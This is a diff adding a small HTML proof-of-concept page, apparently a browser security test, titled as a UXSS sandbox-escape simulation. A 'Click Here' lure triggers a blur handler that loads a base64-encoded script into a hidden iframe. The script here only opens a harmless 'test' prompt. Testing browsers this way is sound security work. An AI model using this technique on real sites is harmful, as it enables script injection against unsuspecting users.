@@ -1,1 +1,25 @@
-
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>UXSS Sandbox Escape Simulation</title>
+  <style>
+    iframe {
+      visibility: hidden;
+    }
+  </style>
+  <script>
+    window.onblur = function () {
+      document.getElementById("iframe").src = "data:text/html;base64,PHNjcmlwdD5wcm9tcHQoInRlc3QiKTwvc2NyaXB0Pg==";
+    };
+  </script>
+</head>
+<body>
+  <center>
+    <br>
+    <h1>Click Here</h1>
+  </center>
+  <iframe id="iframe"></iframe>
+</body>
+</html>
